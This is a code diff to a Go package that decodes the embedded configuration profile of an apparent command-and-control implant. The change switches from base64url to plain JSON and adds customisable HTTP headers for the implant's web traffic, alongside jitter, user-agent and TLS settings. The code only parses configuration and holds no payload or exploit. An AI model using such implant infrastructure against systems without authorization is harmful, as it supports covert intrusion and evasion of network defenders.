@@ -1,13 +1,13 @@
 // Package profile decodes the baked profile (architecture.md Sec 5.1): the
-// base64url JSON map every build unit emits, the language-neutral wire
-// contract between the build pipeline and an implant. The dev shape reads
-// the same knobs from ROD_* environment variables, mirroring the reference
+// profile file's JSON document, staged by every build unit as the same
+// bytes and embedded at compile time -- the language-neutral contract
+// between the build pipeline and an implant. The dev shape reads the same
+// knobs from ROD_* environment variables, mirroring the reference
 // implant's dev shape, so a tree checkout runs against a live teamserver
 // with no build step.
 package profile
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -27,6 +27,7 @@ type Profile struct {
 	JitterSeconds      float64
 	EnrollPath         string
 	UserAgent          string
+	Headers            map[string]string
 	RequestTimeout     time.Duration
 	CaCert             string
 	TlsTrust           string
@@ -37,20 +38,16 @@ type Profile struct {
 	Verbs              []string
 }
 
-// Decode parses a baked profile: the base64url (no padding) bytes of a JSON
-// object. Unknown keys are ignored -- the evolution rules' additive-only
+// Decode parses a baked profile: the profile file's JSON document, embedded
+// verbatim. Unknown keys are ignored -- the evolution rules' additive-only
 // discipline runs both directions.
 func Decode(baked string) (Profile, error) {
 	var p Profile
-	if baked == "" {
+	if strings.TrimSpace(baked) == "" {
 		return p, fmt.Errorf("no baked profile: the artifact was built without one")
 	}
-	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimSpace(baked))
-	if err != nil {
-		return p, fmt.Errorf("baked profile is not base64url: %w", err)
-	}
 	var m map[string]any
-	if err := json.Unmarshal(raw, &m); err != nil {
+	if err := json.Unmarshal([]byte(baked), &m); err != nil {
 		return p, fmt.Errorf("baked profile is not JSON: %w", err)
 	}
 	str := func(key string) string {
@@ -76,6 +73,19 @@ func Decode(baked string) (Profile, error) {
 		p.EnrollPath = "/implants/enroll"
 	}
 	p.UserAgent = str("userAgent")
+	// The bake renders the headers as a sorted JSON object; the decode
+	// keeps every string entry, the presentation surface the web legs
+	// apply.
+	if headers, ok := m["headers"].(map[string]any); ok {
+		for name, value := range headers {
+			if text, ok := value.(string); ok {
+				if p.Headers == nil {
+					p.Headers = map[string]string{}
+				}
+				p.Headers[name] = text
+			}
+		}
+	}
 	p.RequestTimeout = time.Duration(seconds(str("requestTimeout"), 30) * float64(time.Second))
 	p.CaCert = str("caCert")
 	p.TlsTrust = str("tlsTrust")
